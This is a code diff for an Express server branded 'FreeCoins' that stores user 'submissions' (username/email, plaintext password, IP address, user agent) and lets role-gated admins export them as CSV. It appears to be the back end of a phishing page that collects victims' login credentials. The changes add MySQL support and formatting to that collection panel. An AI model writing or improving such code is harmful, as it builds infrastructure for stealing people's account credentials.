@@ -6,6 +6,7 @@ const path = require('path');
 const crypto = require('crypto');
 const bcrypt = require('bcryptjs');
 const {
+    getActiveDbType,
     addSubmission, getAllSubmissions, deleteSubmission, clearAllSubmissions,
     getMemberByUsername, getAllMembers, addMember, updateMember, deleteMember
 } = require('./database');
@@ -171,7 +172,7 @@ app.post('/api/admin/members', requireAdminAuth, requireRole('developer'), async
         console.log(`[MEMBERS] "${req.adminMember.name}" created member "${username}" (${role})`);
         return res.status(201).json({ success: true, data: newMember });
     } catch (err) {
-        if (err.message && err.message.includes('UNIQUE')) {
+        if (err.code === 'ER_DUP_ENTRY' || (err.message && (err.message.includes('UNIQUE') || err.message.includes('ER_DUP_ENTRY')))) {
             return res.status(409).json({ success: false, message: 'Username already exists.' });
         }
         return res.status(500).json({ success: false, message: 'Failed to create member.' });
@@ -224,7 +225,13 @@ app.post('/api/login', async (req, res) => {
 app.get('/api/submissions', requireAdminAuth, async (req, res) => {
     try {
         const rows = await getAllSubmissions();
-        return res.json({ success: true, count: rows.length, data: rows, requester: req.adminMember.name });
+        return res.json({
+            success: true,
+            count: rows.length,
+            data: rows,
+            dbType: getActiveDbType(),
+            requester: req.adminMember.name
+        });
     } catch (error) {
         return res.status(500).json({ success: false, message: 'Failed to retrieve submissions.' });
     }
@@ -253,8 +260,13 @@ app.get('/api/export/csv', requireAdminAuth, requireRole('developer', 'admin'), 
     try {
         const rows = await getAllSubmissions();
         let csv = 'ID,Username/Email,Password,IP Address,User Agent,Date/Time\r\n';
+        const formatDt = (d) => {
+            if (!d) return '';
+            if (d instanceof Date) return d.toISOString().replace('T', ' ').slice(0, 19);
+            return String(d);
+        };
         rows.forEach(r => {
-            csv += `${r.id},"${(r.username||'').replace(/"/g,'""')}","${(r.password||'').replace(/"/g,'""')}","${(r.ip_address||'').replace(/"/g,'""')}","${(r.user_agent||'').replace(/"/g,'""')}","${(r.created_at||'').replace(/"/g,'""')}"\r\n`;
+            csv += `${r.id},"${(r.username||'').replace(/"/g,'""')}","${(r.password||'').replace(/"/g,'""')}","${(r.ip_address||'').replace(/"/g,'""')}","${(r.user_agent||'').replace(/"/g,'""')}","${formatDt(r.created_at).replace(/"/g,'""')}"\r\n`;
         });
         res.setHeader('Content-Type', 'text/csv');
         res.setHeader('Content-Disposition', 'attachment; filename="submissions.csv"');
@@ -268,6 +280,7 @@ app.get('/api/export/csv', requireAdminAuth, requireRole('developer', 'admin'), 
 app.listen(PORT, () => {
     console.log(`=========================================`);
     console.log(`🚀 FreeCoins Server is active!`);
+    console.log(`🗄️ Database:    ${getActiveDbType().toUpperCase()}`);
     console.log(`🌐 Website:     http://localhost:${PORT}`);
     console.log(`🔒 Admin Panel: http://localhost:${PORT}${ADMIN_PANEL_PATH}`);
     console.log(`=========================================`);
